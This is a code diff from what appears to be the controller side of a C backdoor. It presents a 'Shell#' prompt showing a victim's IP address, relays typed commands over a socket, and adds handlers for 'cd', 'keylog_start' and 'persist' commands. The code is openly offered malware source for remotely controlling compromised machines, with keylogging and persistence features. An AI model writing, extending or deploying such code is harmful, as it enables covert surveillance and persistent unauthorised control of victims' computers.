@@ -37,13 +37,24 @@ int main()
 		jump:
 		bzero(&buffer, sizeof(buffer));
                 bzero(&response, sizeof(response));
-                printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
+                printf("\n* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
                 fgets(buffer, sizeof(buffer), stdin);
                 strtok(buffer, "\n");
                 write(client_socket, buffer, sizeof(buffer));
                 if (strncmp("q", buffer, 1) == 0) {
                         break;
-                } else {
+                }
+		else if (strncmp("cd ", buffer, 3) == 0) {
+			goto jump;
+		}
+		else if (strncmp("keylog_start", buffer, 12) == 0) {
+			goto jump;
+		}
+		else if (strncmp("persist", buffer, 7) == 0) {
+			recv(client_socket, response, sizeof(response), 0);
+			printf("%s", response);
+		}
+		 else {
 			recv(client_socket, response, sizeof(response), MSG_WAITALL);
 			printf("%s", response);
 		}
